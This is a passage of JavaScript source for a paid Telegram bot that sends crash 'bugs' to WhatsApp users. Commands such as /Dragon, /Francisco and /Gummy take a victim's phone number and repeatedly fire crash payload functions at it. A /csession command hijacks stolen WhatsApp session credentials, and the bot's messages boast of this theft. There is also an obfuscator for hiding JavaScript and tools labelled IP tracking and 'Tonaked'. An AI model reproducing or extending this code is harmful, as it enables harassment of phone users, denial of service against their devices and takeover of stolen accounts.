<blockquote>༑ 𖣂 Thanks Too 𖣂 ༑ </blockquote> \n
⬡ Я - Zeroth
╰➤ Inventor
⬡ Я - Zelzz
╰➤ Asisten 
⬡ Ota
╰➤ Best Support 
⬡ Xiaa
╰➤ Best Support
⬡ All Buyer Script
╰➤ Supporter

© Я ⵢ Syposie 𖣂
`;

    newButtons = [
      [{ text: "! Back To", callback_data: "mainmenu" }]
    ];
  } else if (data === "tools") {
    newCaption =
`<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.
 
め Inventor : Я - Zeroth
め Version : 1.0
め Language : Javascript 
め Prefix : /
め Runtime : ${runtime} 
め Time : ${WaktuJam} \n
<blockquote>༑ 𖣂 Thanks Too 𖣂 ༑ </blockquote> \n
⬡ /EncryptJs
⬡ /EncryptHtml
⬡ /GetCode
⬡ /Tourl
⬡ /Brat
⬡ /Iqc
⬡ /Xnxx
⬡ /TrackIp
⬡ /Tonaked


© Я ⵢ Syposie 𖣂
`;

    newButtons = [
      [{ text: "! Back To", callback_data: "mainmenu" }]
    ];
  } else if (data === "mainmenu") {
    const runtime = getBotRuntime();
    newCaption = `
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.
 
め Inventor : Я - Zeroth
め Version : 1.0
め Language : Javascript 
め Prefix : /
め Runtime : ${runtime} 
め Time : ${WaktuJam} \n


© Я ⵢ Syposie 𖣂
`;

    newButtons = [
  [
    { text: "⌜🦠⌟ ☇ ウイルス", callback_data: "bugshow" },    
    { text: "⌜⚙️⌟ ☇ コントロール", callback_data: "ownermenu" }
  ],
  [
    { text: "⌜🛠️⌟ ☇ 補助ツール", callback_data: "tools" },
    { text: "⌜👥⌟ ☇ クレジットと知識", callback_data: "thanksto" }
  ],
  [
    { text: "⌜🌍⌟ ☇ コミュニティ", url: "https://t.me/nothingszz" }
  ]
  ];
  } 

  try {
    await bot.editMessageMedia({
      type: "photo",
      media: randomImage,
      caption: newCaption,
      parse_mode: "HTML"
    }, {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: {
        inline_keyboard: newButtons
      }
    });
  } catch (err) {
    if (err.response?.body?.description?.includes("message is not modified")) {
      return bot.answerCallbackQuery(callbackQuery.id, { text: "Sudah di menu ini.", show_alert: false });
    } else {
      console.error("Gagal edit media:", err);
    }
  }

  bot.answerCallbackQuery(callbackQuery.id);
});


/// --- ( Parameter ) --- \\\
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

/// --- ( Case Bug ) --- \\\
bot.onText(/\/Dragon (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const cooldown = checkCooldown(userId);
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const mention = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "! Inventor", url: "https://t.me/Uknownszz" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Dragon
𖥂 Status : Procces
𖥂 Date now : ${date}

© Я ⵢ Hunter 𖣂
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Dragon
𖥂 Status : Procces
𖥂 Date now : ${date}

© Я ⵢ Hunter 𖣂
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 10; i++) {
         await galaxyMessage(sock, target, mention, cta = true);
         await galaxyMessage(sock, target, mention, cta = true);

         }
         console.log(chalk.red(`𖣂 Syposie's  ⵢ Lightning 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Dragon
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}


`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
        console.error(err);
    }
});

bot.onText(/\/Francisco (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const cooldown = checkCooldown(userId);
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const Ptcp = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "! Inventor", url: "https://t.me/Uknownszz" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Francisco
𖥂 Status : Procces
𖥂 Date now : ${date}

© Я ⵢ Syposie 𖣂
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Francisco
𖥂 Status : Procces
𖥂 Date now : ${date}

© Я ⵢ Syposie 𖣂
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 27; i++) {
         await UiAttack(sock, target);
         }
         console.log(chalk.red(`𖣂 Syposie's  ⵢ Lightning 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Francisco
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}


`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/Gummy (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const cooldown = checkCooldown(userId);
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "! Inventor", url: "https://t.me/Uknownszz" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Gummy
𖥂 Status : Procces
𖥂 Date now : ${date}

© Я ⵢ Syposie 𖣂
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Gummy
𖥂 Status : Procces
𖥂 Date now : ${date}

© Я ⵢ Syposie 𖣂
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 50; i++) {
         await VampireInvisIos(target);
         await sleep(1000);    
         await VampireInvisIos(target);
         }
         console.log(chalk.red(`𖣂 Syposie's  ⵢ Lightning 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Gummy
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}


`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});


/// --------- ( Plungi ) --------- \\\

/// --- ( case add bot ) --- \\\
bot.onText(/\/addbot (.+)/, async (msg, match) => {
       const chatId = msg.chat.id;
       if (!isOwner(msg.from.id)) {
       return bot.sendMessage(
       chatId,
 `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
       { parse_mode: "markdown" }
       );
       }
       const botNumber = match[1].replace(/[^0-9]/g, "");

       try {
       await connectToWhatsApp(botNumber, chatId);
       } catch (error) {
       console.error("Error in addbot:", error);
       bot.sendMessage(
       chatId,
       "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
      );
      }
      });
 
           

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❌ *You don't have permission to access this feature.*",
      { parse_mode: "Markdown" }
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

/// --- ( case group only ) --- \\\     
bot.onText(/^\/gconly (on|off)/i, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id;
      
      if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
  }
      const mode = match[1].toLowerCase();
      const status = mode === "on";
      setGroupOnly(status);

      bot.sendMessage(msg.chat.id, `Fitur *Group Only* sekarang: ${status ? "AKTIF" : "NONAKTIF"}`, {
      parse_mode: "markdown",
      });
      });

     


/// --- ( case add acces premium ) --- \\\
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
┏━━━━━━━━━━━━━━━━━━━━━━━┓  
┃   ( ⚠️ ) Akses Ditolak ( ⚠️ )
┣━━━━━━━━━━━━━━━━━━━━━━━┫  
┃ Anda tidak memliki izin untuk ini
┗━━━━━━━━━━━━━━━━━━━━━━━┛`);
     }

     if (!match[1]) {
     return bot.sendMessage(chatId, `
┏━━━━━━━━━━━━━━━━━━━━━━━┓  
┃   ( ❌ ) Comand Salah ( ❌)
┣━━━━━━━━━━━━━━━━━━━━━━━┫  
┃ ✅ /addprem 6843967527 30d.
┗━━━━━━━━━━━━━━━━━━━━━━━┛
`);
     }

     const args = match[1].split(' ');
     if (args.length < 2) {
     return bot.sendMessage(chatId, `
┏━━━━━━━━━━━━━━━━━━━━━━━┓  
┃   ( ❌ ) Comand Salah ( ❌)
┣━━━━━━━━━━━━━━━━━━━━━━━┫  
┃ ✅ /addprem 6843967527 30d.
┗━━━━━━━━━━━━━━━━━━━━━━━┛`);
     }

    const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
    const duration = args[1];
  
    if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
┏━━━━━━━━━━━━━━━━━━━━━━━┓  
┃   ( ❌ ) Comand Salah ( ❌)
┣━━━━━━━━━━━━━━━━━━━━━━━┫  
┃ ✅ /addprem 6843967527 30d.
┗━━━━━━━━━━━━━━━━━━━━━━━┛`);
    }
  
    if (!/^\d+[dhm]$/.test(duration)) {
   return bot.sendMessage(chatId, `
┏━━━━━━━━━━━━━━━━━━━━━━━┓  
┃   ( ❌ ) Comand Salah ( ❌)
┣━━━━━━━━━━━━━━━━━━━━━━━┫  
┃ ✅ /addprem 6843967527 30d.
┗━━━━━━━━━━━━━━━━━━━━━━━┛`);
   }
   
    const now = moment();
    const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

    if (!premiumUsers.find(user => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
    bot.sendMessage(chatId, `
┏━━━━━━━━━━━━━━━━━━━━━━━┓  
┃ ( ✅ ) SUCCES ADD USER 
┣━━━━━━━━━━━━━━━━━━━━━━━┫  
┃User ${userId} ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.
┗━━━━━━━━━━━━━━━━━━━━━━━┛.`);
    } else {
    const existingUser = premiumUsers.find(user => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
     }
     });





/// --- ( case list acces premium ) --- \\\
bot.onText(/\/listprem/, (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;

     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
  }

      if (premiumUsers.length === 0) {
      return bot.sendMessage(chatId, "📌 No premium users found.");
  }

      let message = "```";
      message += "\n";
      message += " ( + )  LIST PREMIUM USERS\n";
      message += "\n";
      premiumUsers.forEach((user, index) => {
      const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
      message += `${index + 1}. ID: ${user.id}\n   Exp: ${expiresAt}\n`;
      });
      message += "\n```";

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});



/// --- ( case add acces admin ) --- \\\
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id
      
        if (!isOwner(senderId)) {
        return bot.sendMessage(
        chatId,`
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);

        { parse_mode: "Markdown" }
   
        }

      if (!match || !match[1]) 
      return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, /addadmin 58273654 30d`);
      
      const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
      if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId,`
❌ Command salah, Masukan user id serta waktu expired, /addadmin 58273654 30d`);
      }

      if (!adminUsers.includes(userId)) {
      adminUsers.push(userId);
      saveAdminUsers();
      console.log(`${senderId} Added ${userId} To Admin`);
      bot.sendMessage(chatId, `
✅Berhasil menambahkan admin, kini user ${userId} Memiliki aksess admin. `);
      } else {
      bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
      }
      });


bot.onText(/^\/csession$/i, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah user adalah owner
    if (!isOwner(senderId)) {
        return bot.sendMessage(chatId, '❌ Khusus owner we.');
    }

    // Cek apakah membalas document
    const doc = msg.reply_to_message?.document;
    if (!doc) {
        return bot.sendMessage(chatId, '❌ Balas file session atau creds.json dengan /colongsender');
    }

    const name = doc.file_name.toLowerCase();

    // Validasi ekstensi file
    const allowedExts = ['.json', '.zip', '.tar', '.tar.gz', '.tgz'];
    if (!allowedExts.some(ext => name.endsWith(ext))) {
        return bot.sendMessage(chatId, '❌ File bukan session tolol.');
    }

    const processingMsg = await bot.sendMessage(chatId, '🔄 Proses colong sender in you session…');

    try {
        // Download file
        const url = await bot.getFileLink(doc.file_id);
        const { data } = await axios.get(url, { responseType: 'arraybuffer' });

        // Buat temporary directory
        const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'));

        // Extract file berdasarkan tipe
        if (name.endsWith('.json')) {
            await fs.writeFile(path.join(tmp, 'creds.json'), data);
        } else if (name.endsWith('.zip')) {
            const AdmZip = require('adm-zip');
            new AdmZip(Buffer.from(data)).extractAllTo(tmp, true);
        } else {
            const tmpTar = path.join(tmp, name);
            await fs.writeFile(tmpTar, data);
            await tar.x({ file: tmpTar, cwd: tmp });
            await fs.rm(tmpTar, { recursive: true, force: true });
        }

        // Cari file creds.json
        const credsPath = await findCredsFile(tmp);
        if (!credsPath) {
            await fs.rm(tmp, { recursive: true, force: true });
            return bot.editMessageText('❌ creds.json tidak ditemukan bego', {
                chat_id: chatId,
                message_id: processingMsg.message_id
            });
        }

        // Baca creds.json untuk mendapatkan nomor bot
        const creds = JSON.parse(await fs.readFile(credsPath, 'utf8'));
        const botNumber = creds.me?.id?.split(':')[0];

        if (!botNumber) {
            await fs.rm(tmp, { recursive: true, force: true });
            return bot.editMessageText('❌ Format creds.json tidak valid', {
                chat_id: chatId,
                message_id: processingMsg.message_id
            });
        }

        // Siapkan directory tujuan
        const destDir = createSessionDir(botNumber);

        // Hapus session lama jika ada, lalu copy yang baru
        await fs.rm(destDir, { recursive: true, force: true });
        await fs.copy(tmp, destDir);

        // Simpan ke active sessions
        saveActiveSessions(botNumber);

        // Connect ke WhatsApp
        const { state, saveCreds } = await useMultiFileAuthState(destDir);

        sock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: P({ level: "silent" }),
            defaultQueryTimeoutMs: undefined,
        });

        // Setup event handlers
        sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === "open") {
                sessions.set(botNumber, sock);
                await bot.editMessageText(`✅ Session ${botNumber} done maling sendernya bre 😈🤭.`, {
                    chat_id: chatId,
                    message_id: processingMsg.message_id
                });
            } else if (connection === "close") {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                if (statusCode && statusCode >= 500 && statusCode < 600) {
                    await bot.editMessageText(`❌ Gagal connect ${botNumber}, coba lagi nanti.`, {
                        chat_id: chatId,
                        message_id: processingMsg.message_id
                    });
                } else {
                    await bot.editMessageText(`❌ Session ${botNumber} invalid atau sudah logout.`, {
                        chat_id: chatId,
                        message_id: processingMsg.message_id
                    });
                    try {
                        await fs.rm(destDir, { recursive: true, force: true });
                    } catch (error) {
                        console.error("Error deleting session:", error);
                    }
                }
            }
        });

        sock.ev.on("creds.update", saveCreds);

        // Bersihkan temporary files
        await fs.rm(tmp, { recursive: true, force: true });

    } catch (error) {
        console.error('Error in colongsender:', error);
        await bot.editMessageText(`❌ Error: ${error.message}`, {
            chat_id: chatId,
            message_id: processingMsg.message_id
        });
    }
});

/// --- ( case delete acces premium ) --- \\\
bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
          const chatId = msg.chat.id;
          const senderId = msg.from.id;
          if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
          return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
          }
          if (!match[1]) {
          return bot.sendMessage(chatId,`
❌ Command salah! Contoh /delprem 584726249 30d.`);
          }
          const userId = parseInt(match[1]);
          if (isNaN(userId)) {
          return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
          }
          const index = premiumUsers.findIndex(user => user.id === userId);
          if (index === -1) {
          return bot.sendMessage(chatId, `❌ User ${userId} tidak terdaftar di dalam list premium.`);
          }
                premiumUsers.splice(index, 1);
                savePremiumUsers();
         bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar premium. `);
         });





/// --- ( case delete acces admin ) \\\
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
        const chatId = msg.chat.id;
        const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
        chatId,`
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,

        { parse_mode: "Markdown" }
        );
        }
        if (!match || !match[1]) {
        return bot.sendMessage(chatId, `
❌Comand salah, Contoh /deladmin 5843967527 30d.`);
        }
        const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
        if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, `
❌Comand salah, Contoh /deladmin 5843967527 30d.`);
        }
        const adminIndex = adminUsers.indexOf(userId);
        if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar admin.`);
        } else {
        bot.sendMessage(chatId, `❌ User ${userId} Belum memiliki aksess admin.`);
        }
        });
// tools dsini
bot.onText(/\/info(?:\s+@?(\w+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const sender = msg.from;
    const replyTo = msg.reply_to_message;
    const mentionedUsername = match[1]; 

    const senderName = sender.first_name + (sender.last_name ? ` ${sender.last_name}` : '');
    const senderMention = sender.username ? `@${sender.username}` : senderName;

 
    if (replyTo?.from) {
        const user = replyTo.from;
        const fullName = user.first_name + (user.last_name ? ` ${user.last_name}` : '');
        return bot.sendMessage(chatId, `
User info:
ID: ${user.id}
Full Name: ${fullName}
Username: ${user.username ? `@${user.username}` : 'Tidak ada'}
<blockquote><b>Diminta oleh ${senderMention}</b></blockquote>
`, {
            parse_mode: 'HTML',
            reply_to_message_id: msg.message_id,
        });
    }
    if (mentionedUsername) {
        try {
            const memberList = await bot.getChatAdministrators(chatId); 
            const botMember = memberList.find(m => m.user.id === bot.id);
            if (!botMember) throw new Error("Bot bukan admin");

            
            const chat = await bot.getChat(chatId);
            const admins = await bot.getChatAdministrators(chatId);

         
            const matchUser = admins.find(admin =>
                admin.user.username &&
                admin.user.username.toLowerCase() === mentionedUsername.toLowerCase()
            );

            if (!matchUser) {
                return bot.sendMessage(chatId, `⚠️ Tidak dapat menemukan pengguna @${mentionedUsername} di grup ini. Pastikan mereka masih anggota.`, {
                    reply_to_message_id: msg.message_id,
                });
            }

            const user = matchUser.user;
            const fullName = user.first_name + (user.last_name ? ` ${user.last_name}` : '');

            return bot.sendMessage(chatId, `
User info:
ID: ${user.id}
Full Name: ${fullName}
Username: ${user.username ? `@${user.username}` : 'Tidak ada'}
<blockquote><b>Diminta oleh ${senderMention}</b></blockquote>
`, {
                parse_mode: 'HTML',
                reply_to_message_id: msg.message_id,
            });

        } catch (err) {
            console.error("❌ Gagal ambil info dengan getChatMember:", err.message);
            return bot.sendMessage(chatId, `⚠️ Gagal mendapatkan informasi @${mentionedUsername}. Pastikan bot adalah admin dan user masih dalam grup.`, {
                reply_to_message_id: msg.message_id,
            });
        }
    }
    return bot.sendMessage(chatId, `
<blockquote>❌ Eror</blockquote>
Harap Reply Target
`, {
        parse_mode: 'HTML',
        reply_to_message_id: msg.message_id,
    });
});


bot.onText(/\/EncryptJs/, async (msg) => {
    const chatId = msg.chat.id;   
    const senderId = msg.from.id;
    const randomImage = getRandomImage(); 
    const userId = msg.from.id.toString();

    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(chatId, "❌ *Error:* Balas file .js dengan `/EncryptJs`!", { parse_mode: "Markdown" });
    }
    const file = msg.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return bot.sendMessage(chatId, "❌ *Error:* Hanya file .js yang didukung!", { parse_mode: "Markdown" });
    }
    const encryptedPath = path.join(__dirname, `Syposie-encrypted-${file.file_name}`);

    try {
        const fileData = await bot.getFile(file.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.file_path}`;
        const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
        let fileContent = response.data.toString("utf-8");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }
        const obfuscated = await JsConfuser.obfuscate(fileContent, getAphocalypsObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }
        await fs.promises.writeFile(encryptedPath, obfuscatedCode);
        await bot.sendDocument(chatId, encryptedPath, {
            caption: "🔥 *File terenkripsi (Syposie Chaos Core) siap!*\n_©Syposie ENC_",
            parse_mode: "Markdown"
        });
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {}
    } catch (error) {
        await bot.sendMessage(chatId, `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`, { parse_mode: "Markdown" });
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {}
    }
});

bot.onText(/\/Tourl/, async (msg) => {
  const chatId = msg.chat.id;
    
  const repliedMsg = msg.reply_to_message;

  if (!repliedMsg || (!repliedMsg.document && !repliedMsg.photo && !repliedMsg.video)) {
    return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
  }

  let fileId, fileName;

  if (repliedMsg.document) {
    fileId = repliedMsg.document.file_id;
    fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
  } else if (repliedMsg.photo) {
    const photos = repliedMsg.photo;
